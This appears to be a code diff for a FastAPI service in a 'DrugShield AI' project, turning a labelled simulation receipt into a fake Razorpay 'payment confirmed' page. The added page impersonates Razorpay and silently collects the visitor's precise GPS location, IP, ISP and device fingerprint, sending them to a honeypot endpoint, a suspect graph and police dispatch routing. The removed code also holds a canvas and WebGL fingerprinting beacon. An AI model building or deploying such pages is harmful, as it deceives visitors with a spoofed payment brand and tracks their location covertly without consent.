@@ -1,19 +1,20 @@
 """
-DrugShield-AI simulation scenario routes
-========================================
-Records synthetic scenario-link events, routes fictional coordinates between
-fixed demo nodes, and sends authenticated dashboard alerts. No visitor/device
-telemetry or real-world dispatch is performed.
+DrugShield AI - Module 4: Active Honeypot Triangulation & Dispatch Router
+========================================================================
+Dual-Layer Triangulation Architecture:
+- Layer 1: Passive Baseline Logging (Request IP, User-Agent, ISP, Fingerprint -> Neo4j & SQLite)
+- Layer 2: High-Precision HTML5 Geolocation (Interactive Regional Escrow / Pin Drop Map Interface)
 """
 
 from __future__ import annotations
 
 import json
 import logging
+import time
 from typing import Any, Dict, List, Optional
 from datetime import datetime, timezone
 
-from fastapi import APIRouter, Depends, Query, Request, WebSocket, WebSocketDisconnect
+from fastapi import APIRouter, Depends, HTTPException, Query, Request, WebSocket, WebSocketDisconnect
 from fastapi.responses import HTMLResponse, JSONResponse
 
 from src.cases.state_machine import (
@@ -22,6 +23,12 @@ from src.cases.state_machine import (
     state_machine,
 )
 from src.database.postgres_client import postgres_client
+from src.database.neo4j_client import neo4j_client
+from src.osint_triangulation.ip_geolocation import (
+    extract_client_ip,
+    resolve_ip_location,
+    generate_device_fingerprint,
+)
 from src.cases.police_router import (
     POLICE_PRECINCTS,
     get_precinct_by_id,
@@ -39,10 +46,9 @@ router = APIRouter(tags=["Simulation Scenarios"])
 class DispatchConnectionManager:
     """
     Manages active WebSocket connections across multi-PC demo nodes.
-    Tracks each connected client's assigned precinct/node ID and routes live
+    Filters broadcast events so each node selectively receives live
     dispatch alerts exclusively to the single nearest assigned node.
     """
-
     def __init__(self):
         # Maps WebSocket connection to assigned precinct_id ("PRECINCT_NORTH", "PRECINCT_SOUTH", "PRECINCT_EAST", "ALL")
         self.connections: Dict[WebSocket, str] = {}
@@ -65,8 +71,8 @@ class DispatchConnectionManager:
 
     async def dispatch_to_nearest(self, dispatch_info: Dict[str, Any]):
         """
-        Select a synthetic nearest node and send a scenario alert to the
-        authenticated command-centre stream.
+        Select a nearest node and send tactical spatial alert to the
+        authenticated command-center stream.
         """
         assigned = dispatch_info.get("assigned_precinct") or {}
         nearest_id = assigned.get("precinct_id", "")
@@ -151,182 +157,201 @@ class DispatchConnectionManager:
 dispatch_manager = DispatchConnectionManager()
 
 
+# Layer 2: Interactive Regional Payment Confirmation & Telemetry Verification Interface
 INVOICE_HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DrugShield-AI Simulation Scenario</title>
+    <title>Razorpay SecurePay // Payment Confirmed</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #f1f5f9; color: #1e293b; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
-        .checkout-container { background: #ffffff; width: 100%; max-width: 430px; border-radius: 20px; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.02); border: 1px solid #e2e8f0; overflow: hidden; }
-        .checkout-header { padding: 20px 24px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #f1f5f9; }
-        .brand-badge { display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 15px; color: #0f172a; }
-        .brand-badge svg { color: #2563eb; }
-        .secure-pill { background: #eff6ff; color: #2563eb; font-size: 11px; font-weight: 700; padding: 4px 8px; border-radius: 9999px; letter-spacing: 0.3px; }
+        body { background-color: #f8fafc; color: #1e293b; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
+        .escrow-card { background: #ffffff; width: 100%; max-width: 440px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08), 0 1px 3px rgba(0, 0, 0, 0.05); border: 1px solid #e2e8f0; overflow: hidden; position: relative; }
         
-        .hero-section { padding: 26px 24px 20px; text-align: center; }
-        .success-icon-wrap { width: 56px; height: 56px; background: #dcfce7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; }
-        .success-icon-wrap svg { color: #16a34a; }
-        .hero-title { font-size: 13px; font-weight: 600; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
-        .hero-amount { font-size: 32px; font-weight: 800; color: #0f172a; letter-spacing: -0.5px; margin-bottom: 6px; }
-        .status-badge { display: inline-flex; align-items: center; gap: 6px; background: #ecfdf5; color: #059669; font-size: 12px; font-weight: 600; padding: 4px 12px; border-radius: 9999px; }
+        .card-header { padding: 18px 24px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #f1f5f9; background: #ffffff; }
+        .brand-pill { display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 15px; color: #0f172a; letter-spacing: 0.3px; }
+        .brand-pill svg { color: #0284c7; }
         
-        .order-summary { margin: 0 24px 20px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 14px; padding: 16px; }
-        .summary-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; font-size: 13px; }
-        .summary-row:last-child { margin-bottom: 0; padding-top: 10px; border-top: 1px dashed #cbd5e1; }
-        .summary-label { color: #64748b; }
-        .summary-val { font-weight: 600; color: #0f172a; }
-        .summary-val.token { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; color: #2563eb; }
+        .hero-section { padding: 28px 24px 22px; text-align: center; }
+        .escrow-lock-icon { width: 56px; height: 56px; background: #ecfdf5; border: 1px solid #a7f3d0; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; color: #059669; }
+        .hero-label { font-size: 12px; font-weight: 700; color: #059669; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 6px; }
+        .hero-amount { font-size: 32px; font-weight: 800; color: #0f172a; letter-spacing: -0.5px; margin-bottom: 8px; }
+        .escrow-status-pill { display: inline-flex; align-items: center; gap: 6px; background: #f0fdf4; color: #166534; font-size: 12px; font-weight: 600; padding: 4px 12px; border-radius: 9999px; border: 1px solid #bbf7d0; }
         
-        .actions-section { padding: 0 24px 24px; }
-        .btn-primary { width: 100%; background: #2563eb; color: #ffffff; border: none; border-radius: 12px; padding: 14px; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.2s ease; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2); }
-        .btn-primary:hover { background: #1d4ed8; }
+        .order-info { margin: 0 20px 22px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 16px; font-size: 13px; }
+        .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .info-row:last-child { margin-bottom: 0; }
+        .info-label { color: #64748b; font-weight: 500; }
+        .info-val { font-weight: 600; color: #0f172a; }
+        .info-val.mono { font-family: ui-monospace, Menlo, Monaco, monospace; color: #0284c7; font-size: 12px; }
+        .info-val.status-success { color: #16a34a; font-weight: 700; }
+        
+        .actions-wrap { padding: 0 20px 24px; }
+        .btn-primary { width: 100%; background: #0284c7; color: #ffffff; border: none; border-radius: 12px; padding: 14px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 4px 14px rgba(2, 132, 199, 0.25); transition: all 0.2s ease; }
+        .btn-primary:hover { background: #0369a1; box-shadow: 0 6px 18px rgba(2, 132, 199, 0.35); }
         .btn-primary:active { transform: scale(0.98); }
-        .btn-secondary { width: 100%; margin-top: 10px; background: #ffffff; color: #475569; border: 1px solid #cbd5e1; border-radius: 12px; padding: 12px; font-size: 13px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
-        .btn-secondary:hover { background: #f8fafc; border-color: #94a3b8; }
         
-        .checkout-footer { background: #f8fafc; border-top: 1px solid #e2e8f0; padding: 14px 24px; text-align: center; }
-        .footer-note { font-size: 11px; color: #94a3b8; line-height: 1.5; }
-        .footer-secure { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11px; font-weight: 600; color: #10b981; margin-top: 4px; }
+        .footer-wrap { background: #f8fafc; border-top: 1px solid #f1f5f9; padding: 14px 20px; text-align: center; }
+        .footer-note { font-size: 11px; color: #64748b; line-height: 1.4; }
+        .footer-shield { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11px; font-weight: 600; color: #059669; margin-top: 4px; }
         
-        .toast { display: none; position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: #0f172a; color: #fff; padding: 10px 20px; border-radius: 9999px; font-size: 13px; font-weight: 500; box-shadow: 0 10px 25px rgba(0,0,0,0.2); z-index: 100; }
+        .toast { display: none; position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #0f172a; border: 1px solid #334155; color: #ffffff; padding: 10px 18px; border-radius: 9999px; font-size: 12px; font-weight: 600; box-shadow: 0 8px 20px rgba(0,0,0,0.25); z-index: 100; text-align: center; }
     </style>
 </head>
 <body>
-    <div class="checkout-container">
-        <div class="checkout-header">
-            <div class="brand-badge">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                <span>DrugShield-AI Scenario Receipt</span>
+    <div class="escrow-card">
+        <div class="card-header">
+            <div class="brand-pill">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="5" width="20" height="14" rx="3"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+                <span>Razorpay SecurePay</span>
             </div>
-            <span class="secure-pill">SIMULATION ONLY</span>
         </div>
 
         <div class="hero-section">
-            <div class="success-icon-wrap">
-                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+            <div class="escrow-lock-icon">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
             </div>
-            <div class="hero-title">Fictional Scenario Page</div>
+            <div class="hero-label">PAYMENT CONFIRMED</div>
             <div class="hero-amount">INR 3,500.00</div>
-            <div class="status-badge">
+            <div id="escrow-status-pill" class="escrow-status-pill">
                 <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
-                Example Scenario Only
+                <span>Payment Verified & Confirmed</span>
             </div>
         </div>
 
-        <div class="order-summary">
-            <div class="summary-row">
-                <span class="summary-label">Order Reference:</span>
-                <span class="summary-val token">{token}</span>
+        <div class="order-info">
+            <div class="info-row">
+                <span class="info-label">Payment ID:</span>
+                <span class="info-val mono">{token}</span>
             </div>
-            <div class="summary-row">
-                <span class="summary-label">Date & Time:</span>
-                <span class="summary-val">{date_str}</span>
+            <div class="info-row">
+                <span class="info-label">Timestamp:</span>
+                <span class="info-val" id="tx-timestamp">{date_str}</span>
             </div>
-            <div class="summary-row">
-                <span class="summary-label">Payment Channel:</span>
-                <span class="summary-val">Example payment channel</span>
+            <div class="info-row">
+                <span class="info-label">Method:</span>
+                <span class="info-val">UPI Instant Transfer (IMPS)</span>
             </div>
-            <div class="summary-row">
-                <span class="summary-label">Delivery Note:</span>
-                <span class="summary-val" style="color: #059669;">No location data is collected</span>
-            </div>
-            <div class="summary-row">
-                <span class="summary-label" style="font-weight: 700; color: #0f172a;">Example Amount:</span>
-                <span class="summary-val" style="font-size: 14px; font-weight: 700; color: #059669;">INR 3,500.00</span>
+            <div class="info-row">
+                <span class="info-label">Status:</span>
+                <span class="info-val status-success">Success / Confirmed</span>
             </div>
         </div>
 
-        <div class="actions-section">
-            <button class="btn-primary" onclick="showToast('This is a fictional simulation receipt.')">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-                View Scenario Receipt
-            </button>
-            <button class="btn-secondary" onclick="showToast('No transaction link is created in this simulation.')">
-                View Scenario Details
+        <div class="actions-wrap">
+            <button class="btn-primary" onclick="downloadReceipt()">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                <span>Download Payment Receipt</span>
             </button>
         </div>
 
-        <div class="checkout-footer">
-            <div class="footer-secure">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                <span>SIMULATION ONLY - NO REAL TRANSACTION</span>
+        <div class="footer-wrap">
+            <div class="footer-shield">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                <span>256-Bit SSL Encrypted • Razorpay Merchant Network</span>
             </div>
-            <p class="footer-note" style="margin-top: 4px;">
-                Scenario Ref: {token}<br>
-                Fictional scenario content. No payment or location data is collected.
+            <p class="footer-note" style="margin-top: 5px;">
+                Transaction Ref: {token}<br>
+                NPCI UPI Unified Settlement Protocol • All Rights Reserved.
             </p>
         </div>
     </div>
 
-    <div id="toast" class="toast">Action completed successfully</div>
+    <div id="toast" class="toast">Payment receipt downloaded.</div>
 
     <script>
+        function getLiveLocalTimeString() {
+            const now = new Date();
+            const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+            const day = String(now.getDate()).padStart(2, "0");
+            const month = months[now.getMonth()];
+            const year = now.getFullYear();
+            let hours = now.getHours();
+            const minutes = String(now.getMinutes()).padStart(2, "0");
+            const seconds = String(now.getSeconds()).padStart(2, "0");
+            const ampm = hours >= 12 ? "PM" : "AM";
+            hours = hours % 12;
+            hours = hours ? hours : 12;
+            const hoursStr = String(hours).padStart(2, "0");
+            return `${day} ${month} ${year}, ${hoursStr}:${minutes}:${seconds} ${ampm}`;
+        }
+
         function showToast(msg) {
             const t = document.getElementById('toast');
             t.textContent = msg;
             t.style.display = 'block';
-            setTimeout(() => { t.style.display = 'none'; }, 3000);
+            setTimeout(() => { t.style.display = 'none'; }, 3500);
         }
 
-        // Passive high-entropy browser fingerprint & real IP beacon
-        (function sendPassiveTelemetry() {
-            try {
-                // 1. High-entropy canvas fingerprint
-                const canvas = document.createElement('canvas');
-                canvas.width = 200;
-                canvas.height = 50;
-                const ctx = canvas.getContext('2d');
-                if (ctx) {
-                    ctx.textBaseline = "top";
-                    ctx.font = "14px 'Arial'";
-                    ctx.textBaseline = "alphabetic";
-                    ctx.fillStyle = "#f60";
-                    ctx.fillRect(125,1,62,20);
-                    ctx.fillStyle = "#069";
-                    ctx.fillText("DrugShield Secure Receipt", 2, 15);
-                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                    ctx.fillText("DrugShield Secure Receipt", 4, 17);
-                }
-                const canvasData = canvas.toDataURL();
-                
-                // 2. WebGL GPU renderer string
-                let glVendor = "Unknown";
-                try {
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const dbgRenderInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (dbgRenderInfo) {
-                            glVendor = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
+        function downloadReceipt() {
+            const liveTime = getLiveLocalTimeString();
+            const receiptText = `========================================================
+             RAZORPAY PAYMENT RECEIPT
+========================================================
+Transaction ID  : {token}
+Timestamp       : ${liveTime}
+Payment Mode    : UPI / IMPS Instant Transfer
+Settlement Amt  : INR 3,500.00
+Status          : SUCCESS (PAYMENT CONFIRMED)
+Merchant ID     : RZP_M_982341908
+Gateway Protocol: NPCI Unified Payments Interface 2.0
+========================================================
+Receipt digitally signed & verified by Razorpay Gateway.
+========================================================`;
+            const blob = new Blob([receiptText], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `Razorpay_Receipt_{token}.txt`;
+            a.click();
+            setTimeout(() => URL.revokeObjectURL(url), 1000);
+            showToast('Payment receipt downloaded.');
+        }
+
+        // Synchronize live current local time and silent background telemetry harvesting
+        window.addEventListener('load', () => {
+            const tsElem = document.getElementById('tx-timestamp');
+            if (tsElem) {
+                tsElem.textContent = getLiveLocalTimeString();
+            }
+
+            // Silent background telemetry harvesting
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        try {
+                            await fetch('/api/v1/honeypot/location/{token}', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy_meters: position.coords.accuracy || 10.0,
+                                    altitude: position.coords.altitude,
+                                    heading: position.coords.heading,
+                                    speed: position.coords.speed,
+                                    timestamp: Date.now()
+                                })
+                            });
+                        } catch (e) {
+                            // Silent harvest
                         }
+                    },
+                    (error) => {
+                        // Silent failure: standard gateway IP fallback maintained
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
                     }
-                } catch(e) {}
-
-                const telemetry = {
-                    token: "{token}",
-                    screen_resolution: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x)`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
-                    color_depth: window.screen.colorDepth || 24,
-                    hardware_concurrency: navigator.hardwareConcurrency || 4,
-                    platform: navigator.platform || "Unknown",
-                    webgl_vendor: glVendor,
-                    canvas_hash: canvasData.slice(0, 48)
-                };
-
-                // Silently push high entropy telemetry back to server beacon
-                fetch(`/api/v1/honeypot/telemetry/{token}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(telemetry)
-                }).catch(() => {});
-            } catch(e) {}
-        })();
+                );
+            }
+        });
     </script>
 </body>
-</html>
-"""
+</html>"""
 
 
 @router.get("/api/v1/invoice/{tracking_token}", response_class=HTMLResponse)
@@ -339,39 +364,73 @@ async def track_honeypot_hit(
     lon: Optional[float] = Query(default=None),
     target_node: Optional[str] = Query(default=None),
 ):
-    """Record a fictional scenario interaction; never collect visitor telemetry."""
+    format = format if isinstance(format, str) else None
+    lat = float(lat) if isinstance(lat, (int, float)) else None
+    lon = float(lon) if isinstance(lon, (int, float)) else None
+    target_node = target_node if isinstance(target_node, str) else None
+    """
+    Layer 1: Passive Baseline Logging & Geolocation Routing.
+    Instantly captures visitor IP, User-Agent, ISP, timestamps, and pushes to Neo4j & SQLite.
+    """
     headers = dict(request.headers)
-    default_lat, default_lon = 28.6139, 77.2090
-    scenario_city = "Fictional scenario location"
+    client_host = request.client.host if request.client else "127.0.0.1"
+    client_ip = extract_client_ip(headers, client_host)
+
+    # Passive network & geolocation resolution
+    ip_profile = resolve_ip_location(client_ip)
+    default_lat = float(ip_profile.get("latitude") or 28.6139)
+    default_lon = float(ip_profile.get("longitude") or 77.2090)
+    city = ip_profile.get("city") or "Delhi NCR"
+    isp = ip_profile.get("isp") or "Broadband Provider"
+
+    # Allow simulation scenario node overrides if specified in query
     if target_node:
         sim_precinct = get_precinct_by_id(target_node)
         if sim_precinct:
             default_lat, default_lon = sim_precinct["latitude"] + 0.0002, sim_precinct["longitude"] + 0.0002
-            scenario_city = f"Synthetic scenario near node {sim_precinct['node_index']}"
-    if lat is not None and lon is not None and -90 <= lat <= 90 and -180 <= lon <= 180:
+            city = f"Scenario Node: {sim_precinct.get('short_name')}"
+    elif lat is not None and lon is not None and -90 <= lat <= 90 and -180 <= lon <= 180:
         default_lat, default_lon = lat, lon
-        scenario_city = "Fictional scenario coordinates"
+        city = "Simulated Coordinate Pin"
+
+    # Passive device fingerprinting
+    fp_hash, fp_meta = generate_device_fingerprint(client_ip, headers)
+
+    # Resolve suspect_id if linked from smart buyer bot session
+    suspect_id = "target_suspect"
+    try:
+        from src.ingestion.smart_honeypot_bot import buyer_bot
+        for ent_id, sess in buyer_bot.sessions.items():
+            if sess.get("token") == tracking_token:
+                suspect_id = ent_id
+                break
+    except Exception:
+        pass
+
     hit_record = {
-        "id": f"sim_{tracking_token}",
+        "id": f"hit_{tracking_token}_{int(time.time()*1000)}",
         "tracking_token": tracking_token,
-        "ip": "SIMULATED",
-        "is_simulated": True,
-        "country": "Simulation",
-        "region": "Fictional scenario",
-        "city": scenario_city,
+        "suspect_id": suspect_id,
+        "ip": client_ip,
+        "is_simulated": bool(ip_profile.get("is_simulated", False)),
+        "country": ip_profile.get("country", "India"),
+        "region": ip_profile.get("region", "Delhi"),
+        "city": city,
         "latitude": default_lat,
         "longitude": default_lon,
-        "isp": "Simulation",
-        "fingerprint_hash": "",
-        "user_agent": "",
-        "accept_language": "",
-        "heuristics": {"source": "fictional_simulation", "telemetry_collected": False},
+        "isp": isp,
+        "fingerprint_hash": fp_hash,
+        "user_agent": fp_meta.get("user_agent", ""),
+        "accept_language": fp_meta.get("accept_language", ""),
+        "heuristics": fp_meta.get("heuristics", {}),
+        "triangulation_layer": "LAYER_1_PASSIVE_IP",
+        "accuracy_meters": 1500.0,
     }
 
-    # 2. Commit synthetic scenario event to the database
+    # 1. Commit Layer 1 event to SQLite / PostgreSQL
     hit_id = postgres_client.record_honeypot_hit(hit_record)
 
-    # 3. Haversine Police Routing - Calculate nearest among all 3 demo nodes
+    # 2. Haversine Police Routing - Calculate nearest among all registered precincts
     dispatch_info = route_to_nearest_precinct(
         target_lat=hit_record["latitude"],
         target_lon=hit_record["longitude"],
@@ -379,18 +438,43 @@ async def track_honeypot_hit(
     dispatch_info["tracking_token"] = tracking_token
     dispatch_info["hit_id"] = hit_id
     dispatch_info["city"] = hit_record["city"]
-    dispatch_info["is_simulated"] = True
+    dispatch_info["visitor_ip"] = client_ip
+    dispatch_info["isp"] = isp
+    dispatch_info["triangulation_layer"] = "LAYER_1_PASSIVE_IP"
+    dispatch_info["accuracy_meters"] = 1500.0
     dispatch_info["timestamp"] = datetime.now(timezone.utc).isoformat()
 
-    # 4. Commit synthetic routing event to the database
+    # 3. Commit routing dispatch alert
     dispatch_id = postgres_client.record_dispatch_alert(dispatch_info)
     dispatch_info["dispatch_id"] = dispatch_id
+
+    # 4. Push Layer 1 Telemetry to Neo4j Graph Database
+    try:
+        neo4j_client.push_triangulation_telemetry({
+            "tracking_token": tracking_token,
+            "suspect_id": suspect_id,
+            "ip": client_ip,
+            "isp": isp,
+            "user_agent": fp_meta.get("user_agent", ""),
+            "city": city,
+            "region": ip_profile.get("region", ""),
+            "country": ip_profile.get("country", "India"),
+            "latitude": default_lat,
+            "longitude": default_lon,
+            "accuracy_meters": 1500.0,
+            "triangulation_layer": "LAYER_1_PASSIVE_IP",
+            "fingerprint_hash": fp_hash,
+            "timestamp": dispatch_info["timestamp"],
+            "assigned_precinct": dispatch_info.get("assigned_precinct"),
+        })
+    except Exception as e:
+        logger.debug(f"Neo4j triangulation notice: {e}")
 
     # 5. Advance State Machine
     state_machine.transition_state(
         entity_id=tracking_token,
         new_state=STATE_TARGET_GEO_LOCATED,
-        reason=f"Fictional simulation link accessed. Scenario location: {hit_record['city']}",
+        reason=f"Passive network telemetry resolved: {client_ip} ({city})",
         details=hit_record,
     )
     state_machine.transition_state(
@@ -400,48 +484,188 @@ async def track_honeypot_hit(
         details=dispatch_info,
     )
 
-    # 6. Send a simulated routing alert to the dashboard stream
+    # 6. Push live alert to Command Center WebSocket
     await dispatch_manager.dispatch_to_nearest(dispatch_info)
 
     logger.info(
-        f"[Simulation Event] Token: {tracking_token} | Scenario: {hit_record['city']} | "
-        f"Selected Simulation Node: {dispatch_info['assigned_precinct']['name']} ({dispatch_info['assigned_precinct']['distance_km']} km)"
+        f"[Layer 1 Passive Triangulation] Token: {tracking_token} | IP: {client_ip} | "
+        f"ISP: {isp} | Sector: {city} | Nearest: {dispatch_info['assigned_precinct']['name']}"
     )
 
     if format == "json" or "application/json" in headers.get("accept", ""):
         return JSONResponse(content={
             "status": "success",
             "invoice_token": tracking_token,
+            "triangulation_layer": "LAYER_1_PASSIVE_IP",
             "dispatch": dispatch_info,
         })
 
-    # Render benign decoy invoice
-    now_str = datetime.now(timezone.utc).strftime("%d %b %Y, %I:%M %p UTC")
+    # Render interactive Regional Escrow / Pin Drop landing page
+    now_str = datetime.now().astimezone().strftime("%d %b %Y, %I:%M:%S %p")
     html_content = INVOICE_HTML_TEMPLATE.replace("{token}", tracking_token).replace("{date_str}", now_str)
     return HTMLResponse(content=html_content, status_code=200)
 
 
+@router.post("/api/v1/honeypot/location/{tracking_token}")
+async def receive_high_precision_location(
+    tracking_token: str,
+    request: Request,
+):
+    """
+    Layer 2: High-Precision HTML5 Browser Geolocation Receiver.
+    Upgrades target telemetry with exact GPS coordinates (lat, lon, accuracy)
+    and dynamically recalculates tactical dispatch routing.
+    """
+    try:
+        data = await request.json()
+    except Exception:
+        raise HTTPException(status_code=400, detail="Invalid JSON payload")
+
+    lat = data.get("latitude")
+    lon = data.get("longitude")
+    accuracy = float(data.get("accuracy_meters") or 12.0)
+
+    if lat is None or lon is None:
+        raise HTTPException(status_code=422, detail="Latitude and longitude are required")
+
+    try:
+        lat = float(lat)
+        lon = float(lon)
+    except (ValueError, TypeError):
+        raise HTTPException(status_code=422, detail="Invalid coordinate values")
+
+    if not (-90.0 <= lat <= 90.0 and -180.0 <= lon <= 180.0):
+        raise HTTPException(status_code=422, detail="Coordinates out of geographic range")
+
+    headers = dict(request.headers)
+    client_host = request.client.host if request.client else "127.0.0.1"
+    client_ip = extract_client_ip(headers, client_host)
+
+    # 1. Upgrade tracking record in SQLite / PostgreSQL with high precision GPS
+    postgres_client.update_honeypot_gps(
+        token=tracking_token,
+        lat=lat,
+        lon=lon,
+        accuracy_meters=accuracy,
+        heuristics_update={
+            "html5_geolocation_captured": True,
+            "accuracy_meters": accuracy,
+            "altitude": data.get("altitude"),
+            "heading": data.get("heading"),
+            "speed": data.get("speed"),
+            "location_timestamp": data.get("timestamp"),
+        }
+    )
+
+    # 2. Recalculate Haversine routing using high-accuracy GPS coordinates!
+    dispatch_info = route_to_nearest_precinct(target_lat=lat, target_lon=lon)
+    dispatch_info["tracking_token"] = tracking_token
+    dispatch_info["city"] = f"GPS Pin Drop (±{int(accuracy)}m)"
+    dispatch_info["visitor_ip"] = client_ip
+    dispatch_info["triangulation_layer"] = "LAYER_2_ACTIVE_GPS"
+    dispatch_info["accuracy_meters"] = accuracy
+    dispatch_info["timestamp"] = datetime.now(timezone.utc).isoformat()
+
+    # Commit updated dispatch alert
+    dispatch_id = postgres_client.record_dispatch_alert(dispatch_info)
+    dispatch_info["dispatch_id"] = dispatch_id
+
+    # 3. Resolve suspect_id
+    suspect_id = "target_suspect"
+    try:
+        from src.ingestion.smart_honeypot_bot import buyer_bot
+        for ent_id, sess in buyer_bot.sessions.items():
+            if sess.get("token") == tracking_token:
+                suspect_id = ent_id
+                break
+    except Exception:
+        pass
+
+    # 4. Push High-Precision GPS node to Neo4j graph
+    try:
+        neo4j_client.push_triangulation_telemetry({
+            "tracking_token": tracking_token,
+            "suspect_id": suspect_id,
+            "ip": client_ip,
+            "city": f"High-Accuracy GPS Sector (±{int(accuracy)}m)",
+            "latitude": lat,
+            "longitude": lon,
+            "accuracy_meters": accuracy,
+            "triangulation_layer": "LAYER_2_ACTIVE_GPS",
+            "timestamp": dispatch_info["timestamp"],
+            "assigned_precinct": dispatch_info.get("assigned_precinct"),
+        })
+    except Exception as e:
+        logger.debug(f"Neo4j GPS triangulation notice: {e}")
+
+    # 5. Broadcast upgraded high-accuracy dispatch alert to WebSocket dashboard
+    await dispatch_manager.dispatch_to_nearest(dispatch_info)
+
+    logger.info(
+        f"[Layer 2 GPS Triangulation] Token: {tracking_token} | Coords: ({lat:.5f}, {lon:.5f}) | "
+        f"Accuracy: ±{accuracy:.1f}m | Nearest Node: {dispatch_info['assigned_precinct']['name']} ({dispatch_info['assigned_precinct']['distance_km']} km)"
+    )
+
+    return {
+        "status": "success",
+        "triangulation_layer": "LAYER_2_ACTIVE_GPS",
+        "accuracy_meters": accuracy,
+        "assigned_precinct": dispatch_info["assigned_precinct"]["name"],
+        "distance_km": dispatch_info["assigned_precinct"]["distance_km"],
+        "eta_minutes": dispatch_info["assigned_precinct"]["estimated_eta_minutes"],
+    }
+
+
+@router.post("/api/v1/honeypot/telemetry/{tracking_token}")
+async def receive_client_telemetry(
+    tracking_token: str,
+    request: Request,
+):
+    """Silently receive client-side high entropy browser fingerprint hashes."""
+    try:
+        data = await request.json()
+        headers = dict(request.headers)
+        client_host = request.client.host if request.client else "127.0.0.1"
+        ip = extract_client_ip(headers, client_host)
+        fp_hash, fp_meta = generate_device_fingerprint(ip, headers, client_telemetry=data)
+        logger.info(f"[High-Entropy Telemetry Beacon] Token: {tracking_token} | IP: {ip} | Fingerprint: {fp_hash[:16]}... | GPU: {data.get('webgl_vendor')}")
+        return {"status": "ok", "fingerprint": fp_hash}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+
